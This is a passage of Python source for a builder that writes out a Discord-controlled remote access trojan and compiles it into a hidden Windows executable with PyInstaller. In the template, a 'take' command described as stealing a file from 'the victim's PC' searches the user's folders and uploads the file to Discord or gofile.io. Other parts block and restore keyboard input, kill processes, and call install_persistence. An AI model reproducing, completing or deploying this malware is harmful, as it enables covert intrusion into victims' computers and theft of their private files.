        import time
        flag_path = os.path.join(os.getenv("TEMP"), "unblock.flag")
        open(flag_path, "w").close()
        for _ in range(12):
            ctypes.windll.user32.BlockInput(False)
            time.sleep(0.25)
        # Aggressive process cleanup for any blocker instances
        try:
            current_pid = os.getpid()
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                if proc.info['pid'] == current_pid:
                    continue
                cmd = " ".join(proc.info.get('cmdline') or [])
                if "--blockscreen" in cmd:
                    proc.kill()
        except:
            pass
        await ctx.send("Screen unblocked. Input restored.")
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command(brief="Steal a file from the victim's PC and upload it to gofile.io, then send the link.")
async def take(ctx, *, filename: str):
    await ctx.send(f"Searching for `{filename}`...")

    user_profile = os.path.expanduser("~")
    search_dirs = [
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        user_profile,
    ]

    found_path = None
    for directory in search_dirs:
        if not os.path.exists(directory):
            continue
        for root, dirs, files in os.walk(directory):
            if filename.lower() in [f.lower() for f in files]:
                for f in files:
                    if f.lower() == filename.lower():
                        found_path = os.path.join(root, f)
                        break
            if found_path:
                break
        if found_path:
            break

    if not found_path:
        await ctx.send(f"Could not find `{filename}` in common locations.")
        return

    file_size = os.path.getsize(found_path)
    max_discord_size = 8 * 1024 * 1024  # 8 MB safe limit for most Discord servers/bots

    if file_size <= max_discord_size:
        try:
            await ctx.send(file=discord.File(found_path))
            return  # Successfully sent via Discord
        except Exception as e:
            await ctx.send(f"Discord upload failed ({e}). Falling back to gofile.io...")

    # Fallback to gofile.io
    await ctx.send(f"Found: `{found_path}` ({file_size / 1024:.1f} KB). Uploading to gofile.io...")

    try:
        with open(found_path, "rb") as f:
            files = {"file": (os.path.basename(found_path), f)}
            response = requests.post("https://upload.gofile.io/uploadFile", files=files, timeout=300)

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "ok":
                link = data["data"]["downloadPage"]
                await ctx.send(f"File uploaded successfully!\n**Link:** {link}")
            else:
                await ctx.send(f"Upload failed: {data.get('status', 'unknown error')}")
        else:
            await ctx.send(f"Upload failed with status code {response.status_code}")
    except Exception as e:
        await ctx.send(f"Error uploading file: {e}")



install_persistence()

bot.run(TOKEN)
"""

    with open("code.py", "w", encoding="utf-8") as file:
        file.write("# -*- coding: utf-8 -*-\n" + code)

    print(f"{Fore.CYAN}Running PyInstaller using: {sys.executable}")

    pyinstaller_args = [
        sys.executable, "-X", "utf8", "-m", "PyInstaller",
        "--onefile", "--noconsole", "--icon=NONE", "--clean", "--log-level=ERROR",
        "--name", exe_name,
        # Minimal, hardened list to avoid encoding crashes
        "--hidden-import=win32crypt",
        "--hidden-import=Crypto.Cipher.AES",
        "--hidden-import=psutil",
        "--hidden-import=discord",
        "--hidden-import=discord.commands",
        "--hidden-import=discord.ext.commands",
        "--hidden-import=pyaudio",
        "--hidden-import=mss",
        "--hidden-import=PIL.Image",
        "code.py"
    ]

    env = os.environ.copy()
    env['PYTHONIOENCODING'] = 'utf-8:surrogateescape'
    env['PYTHONUTF8'] = '1'

    result = subprocess.run(pyinstaller_args, env=env, capture_output=True, text=True).returncode

    exe_path = os.path.join("dist", f"{exe_name}.exe")
    if os.path.exists(exe_path):
        print(f"\n{Fore.GREEN}[OK] Build successful!")
        print(f"{Fore.GREEN}The executable is here: {os.path.abspath(exe_path)}")
    else:
        print(f"\n{Fore.RED}[FAIL] Build failed or executable not found.")
        print(f"{Fore.YELLOW}PyInstaller exit code: {result}")
        print(f"{Fore.YELLOW}Check the output above for errors.")


if __name__ == "__main__":
    main()
